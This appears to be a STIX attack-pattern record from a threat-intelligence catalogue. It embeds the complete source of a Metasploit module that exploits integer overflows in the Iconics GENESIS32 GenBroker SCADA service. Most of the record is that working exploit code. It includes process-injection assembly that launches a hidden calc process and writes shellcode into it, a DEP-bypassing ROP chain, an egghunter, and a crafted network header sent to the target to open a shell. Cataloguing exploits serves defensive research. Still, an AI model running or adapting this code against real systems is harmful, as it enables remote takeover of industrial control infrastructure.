{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--feddadd9-5296-45c8-8dc0-ad846b8572ef",
    "created": "2024-08-14T16:39:14.294299Z",
    "modified": "2024-08-14T16:39:14.294303Z",
    "name": "\"Iconics GENESIS32 Integer Overflow Version 9.21.201.01\"",
    "description": " The GenBroker service on port 38080 is affected by three integer overflow vulnerabilities while handling opcode 0x4b0, which is caused by abusing the the memory allocations needed for the number of elements passed by the client. This results unexpected behaviors such as direct registry calls, memory location calls, or arbitrary remote code execution.  Please note that in order to ensure reliability, this exploit will try to open calc (hidden), inject itself into the process, and then open up a shell session.  Also, DEP bypass is supported.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/scada/iconics_genbroker.rb",
            "external_id": "iconics_genbroker.rb"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.org/adv/genesis_4-adv.txt"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/alerts/ICS-ALERT-11-080-02"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Iconics GENESIS32 Integer Overflow Version 9.21.201.01\",\n      'Description'    => %q{\n          The GenBroker service on port 38080 is affected by three integer overflow\n        vulnerabilities while handling opcode 0x4b0, which is caused by abusing the\n        the memory allocations needed for the number of elements passed by the client.\n        This results unexpected behaviors such as direct registry calls, memory location\n        calls, or arbitrary remote code execution.  Please note that in order to ensure\n        reliability, this exploit will try to open calc (hidden), inject itself into the\n        process, and then open up a shell session.  Also, DEP bypass is supported.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Luigi Auriemma', #Initial discovery, poc\n          'Lincoln',        #Metasploit\n          'corelanc0d3r <peter.ve[at]corelan.be>',   #Metasploit + custom migrate fu\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '72817'],\n          ['URL', 'http://aluigi.org/adv/genesis_4-adv.txt'],\n          ['URL', 'https://www.cisa.gov/uscert/ics/alerts/ICS-ALERT-11-080-02']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"thread\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [\n            'Windows XP',\n            {\n              'Ret' => \"\\x70\\x45\",\n              'Max' => 9000,\n            }\n          ],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-03-21',\n      'DefaultTarget'  => 0))\n\n      register_options(\n        [\n          Opt::RPORT(38080)\n        ])\n  end\n\n  def exploit\n\n    migrate_asm = %Q|\nadd esp,-500                  ; adjust the stack to be sure\npushad                        ; save stuff\n\nfind_kernel32:                ;find kernel32\npush esi                      ; Save esi\nxor  esi, esi                 ; Zero esi\nmov  eax, fs:[esi + 0x4]      ; Extract TEB\nmov  eax, [eax - 0x1c]\nfind_kernel32_base:\nfind_kernel32_base_loop:\ndec  eax                      ; Subtract to our next page\nxor  ax, ax                   ; Zero the lower half\ncmp  word [eax], 0x5a4d       ; Is this the top of kernel32?\njne  find_kernel32_base_loop  ; Nope?  Try again.\nfind_kernel32_base_finished:\npop  esi                      ; Restore esi\n\nmov edx,eax                   ; save base of kernel32 in edx\n\njmp main_routine\n\n; find function pointer\nfind_function:\npushad                        ;save all registers\nmov ebp, [esp + 0x24]         ;base address of module that is being loaded in ebp\nmov eax, [ebp + 0x3c]         ;skip over MSDOS header\nmov edx, [ebp + eax + 0x78]   ;go to export table and put RVA in edx\nadd edx, ebp                  ;add base address to it.\nmov ecx, [edx + 0x18]         ;set up counter ECX (how many exported items are in array ?)\n\nmov ebx, [edx + 0x20]         ;put names table relative offset in ebx\nadd ebx, ebp                  ;add base address to it (ebx = absolute address of names table)\n\n;(should never happen)\n;unless function could not be found\nfind_function_loop:\njecxz find_function_finished  ;if ecx=0, then last symbol has been checked.\n\ndec ecx                       ;ecx=ecx-1\n;with the current symbol\n;and store offset in esi\nmov esi, [ebx + ecx * 4]      ;get relative offset of the name associated\nadd esi, ebp                  ;add base address (esi = absolute address of current symbol)\n\ncompute_hash:\nxor edi, edi                  ;zero out edi\nxor eax, eax                  ;zero out eax\ncld                           ;clear direction flag.\n\ncompute_hash_again:\nlodsb                         ;load bytes at esi (current symbol name) into al, + increment esi\ntest al, al                   ;end of string ?\njz compute_hash_finished      ;yes\nror edi, 0xd                  ;no, rotate value of hash 13 bits to the right\nadd edi, eax                  ;add current character of symbol name to hash accumulator\njmp compute_hash_again        ;continue loop\n\ncompute_hash_finished:\n\nfind_function_compare:\ncmp edi, [esp + 0x28]         ;see if computed hash matches requested hash (at esp+0x28)\njnz find_function_loop        ;no match, go to next symbol\nmov ebx, [edx + 0x24]         ;if match : extract ordinals table (relative offset and put in ebx)\nadd ebx, ebp                  ;add base address (ebx = absolute address of ordinals address table)\nmov  cx, [ebx + 2 * ecx]      ;get current symbol ordinal number (2 bytes)\nmov ebx, [edx  +  0x1c]       ;get address table relative and put in ebx\nadd ebx, ebp                  ;add base address (ebx = absolute address of address table)\nmov eax, [ebx + 4 * ecx]      ;get relative function offset from its ordinal and put in eax\nadd eax, ebp                  ;add base address (eax = absolute address of function address)\nmov [esp + 0x1c], eax         ;overwrite stack copy of eax so popad (return func addr in eax)\n\nfind_function_finished:       ;retrieve original registers (eax will contain function address)\npopad\nret\n\n;--------------------------------------------------------------------------------------\nfind_funcs_for_dll:\nlodsd                         ;load current hash into eax (pointed to by esi)\npush eax                      ;push hash to stack\npush edx                      ;push base address of dll to stack\ncall find_function\nmov [edi], eax                ;write function pointer into address at edi\nadd esp, 0x08                 ;adjust stack\nadd edi, 0x04                 ;increase edi to store next pointer\ncmp esi, ecx                  ;did we process all hashes yet ?\njne find_funcs_for_dll        ;get next hash and lookup function pointer\nfind_funcs_for_dll_finished:\nret\n\n;--------------------------------------------------------------------------------------\nmain_routine:\nsub esp,0x1c                  ;allocate space on stack to store function addresses + ptr to string\nmov ebp,esp\n; ebp+4\t : GetStartupInfo\n; ebp+8  : CreateProcess\n; ebp+C  : VirtualAllocEx\n; ebp+10 : WriteProcessMemory\n; ebp+14 : CreateRemoteThread\n; ebp+18 : Sleep\n; ebp+1c : ptr to calc\n\njmp get_func_hash\nget_func_hash_return:\n\npop esi                       ;get pointer to hashes into esi\n;edi will be increased with 0x04 for each hash\nlea edi, [ebp+0x4]            ;we will store the function addresses at edi\n\nmov ecx,esi\nadd ecx,0x18\ncall find_funcs_for_dll       ;get function pointers for all hashes\n\n; get our own startupinfo at esp+0x60\n; ebp+4 = GetStartupInfo\nmov edx,esp\nadd edx,0x60\npush edx\ncall [ebp+0x4]\n;ptr to startupinfo is in eax\n\n; create a new process\n; pointer to string is in ecx\n; ebp+8 = CreateProcessA\n; ptr to startupinfo is now in eax\n; no need to patch startupinfo, target runs as a service\n; +2c : dwFlags : set to 0x1\n; +30 : wShowWind : set to 0 (hide)\n\n; create the process\nmov edi,eax\nadd edi,48\npush edi                      ; lpProcessInformation : write processinfo here\npush eax                      ; lpStartupInfo : current info (read)\npush 0                        ; lpCurrentDirectory\npush 0                        ; lpEnvironment\npush 0x08000000               ; dwCreationFlags\npush 0                        ; bInHeritHandles\npush 0\npush 0\npush esi                      ; ptr to calc\npush 0\ncall [ebp+0x8]\n; muahah calc ftw, now sleep a bit\npush 0xbb8                    ; 3 seconds\ncall [ebp+0x18]\n\n; allocate memory in the process (VirtualAllocEx())\n; get handle\nmov ecx,[edi]\npush 0x40                     ; RWX\npush 0x1000                   ; MEM_COMMIT\npush 0x1000                   ; size\npush 0                        ; address\npush ecx                      ; handle\ncall [ebp+0xc]\n\n; eax now contains the destination\n; WriteProcessMemory()\nmov ecx,[edi]                 ; pick up handle again\npush 0x1000                   ; size\n; pick up pointer to shellcode & push to stack\nmov ebx,[esp+0x20]\nadd ebx,320\npush ebx                      ; source\npush eax                      ; destination\npush ecx                      ; handle\ncall [ebp+0x10]\n\n; run the code (CreateRemoteThread())\nmov ecx,[edi]                 ; pick up handle again\npush 0                        ; lpthreadID\npush 0                        ; run immediately\npush 0                        ; no parameter\nmov ebx,[esp-0x4]\npush ebx                      ; shellcode\npush 0x2000                   ; stacksize\npush 0                        ; lpThreadAttributes\npush ecx\ncall [ebp+0x14]               ; go baby !\n\n\nget_func_hash:\ncall get_func_hash_return\ndb 0xD7                       ;GetStartupInfoA\ndb 0xE3\ndb 0x7A\ndb 0x86\ndb 0x72                       ;CreateProcessA\ndb 0xfe\ndb 0xb3\ndb 0x16\ndb 0x9c                       ;VirtualAllocEx\ndb 0x95\ndb 0x1a\ndb 0x6e\ndb 0xa1                       ;WriteProcessMemory\ndb 0x6a\ndb 0x3d\ndb 0xd8\ndb 0xdd                       ;CreateRemoteThread\ndb 0x9c\ndb 0xbd\ndb 0x72                       ;Sleep\ndb 0xB0\ndb 0x49\ndb 0x2D\ndb 0xDB\n\n; sneak in ptr to string too :)\ndb \"calc\"\ndb 0x00\n|\n\n    migrate = Metasm::Shellcode.assemble(Metasm::Ia32.new, migrate_asm).encode_string\n\n    nops = make_nops(10) * 4\n    thepayload = migrate << nops << payload.encoded\n\n    eggoptions =\n    {\n      :eggtag => 'w00t',\n    }\n\n    hunter, egg = generate_egghunter(thepayload, \"\", eggoptions)\n\n    header  = \"\\x01\\x00\\x00\\x1e\\x00\\x00\\x00\\x01\\x00\\x00\\x1f\\xf4\\x01\\x00\\x00\\x00\"\n    header << \"\\x00\\x00\\x00\\x00\\xb0\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    header << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\n    header << \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x40\"\n\n    rop_chain =\n    [\n      0x100b257b,  # POP ESP # RETN\n      0x771a22e4,  # pointer in ecx -> initial ret to ret to pointer -> beg rop (thank you mona.py)\n      0x10047355,  # Duplicate, readable, RETN\n      0x10047355,  # POP EAX # RETN    ** [GenClientU.dll]\n      0xffffffde,\n      0x7c3b2c65,  # NEG EAX # RETN    ** [MSVCP71.dll]\n      0x1011e33e,  # XCHG EAX,EDX # RETN\n      0x1001ab22,  # POP ECX # RETN    ** [GenClientU.dll]\n      0x77dd1404,  # ptr to ptr to NtSetInformationProcess()  (ADVAPI.dll, static on XP)\n      0x100136c0,  # MOV EAX,DWORD PTR DS:[ECX] # RETN    ** [GenClientU.dll]\n      0x1008cfd1,  # POP EDI, POP ESI, POP EBP, POP EBX, POP ESI,RETN ** [GenClientU.dll]\n      0x10080163,  # POP ESI # RETN -> EDI\n      0x41414141,\n      0x41414141,\n      0xffffffff,  # NtCurrentProcess() (EBX)\n      0x7c331d24,  # ptr to 0x2 -> ECX\n      0x10090e3d,  # XCHG EAX,EBP # RETN    ** [GenClientU.dll]\n      0x10047355,  # POP EAX # RETN    ** [GenClientU.dll]\n      0xfffffffc,\n      0x7c3b2c65,  # NEG EAX # RETN    ** [MSVCP71.dll]\n      0x100dda84,  # PUSHAD # RETN    ** [GenClientU.dll]\n      0x90908aeb,  # go to egghunter\n    ].pack('V*')\n\n    sploit  = target['Ret'] * 180\n    sploit << [0x74757677].pack('V') * 8\n    sploit << \"\\x77\\x77\"\n    sploit << hunter  #32 byte hunter, no room for checksum\n    sploit << rop_chain\n    sploit << make_nops(28)\n    sploit << egg\n\n    sploit << rand_text_alpha(target['Max']-sploit.length)\n\n    connect\n    print_status(\"Sending request. This will take a few seconds...\")\n    sock.put(header + sploit)\n\n    handler\n    disconnect\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-21",
    "x_mitre_platforms": [
        "win'"
    ]
}